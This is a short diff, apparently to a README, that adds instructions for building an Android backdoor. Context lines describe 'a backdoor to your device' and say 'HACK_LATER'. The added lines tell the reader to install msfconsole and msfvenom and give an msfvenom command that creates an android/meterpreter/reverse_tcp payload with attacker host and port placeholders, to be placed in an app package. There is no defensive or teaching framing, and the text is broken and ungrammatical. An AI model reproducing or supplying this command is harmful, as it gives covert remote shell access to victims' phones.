@@ -10,3 +10,9 @@ its not a payload its an backdoor to your device
 ==> enjoy now!
 
 ==>HACK_LATER!!!
+
+
+install msfconsole and msfvenom 
+run this on terminal msfvenom -p android/meterpreter/reverse_tcp -LHOST <ifconfig on otherterminal(ip)> -LPORT <no ssh(port number)> >> <filename>
+  
+  venom install in package
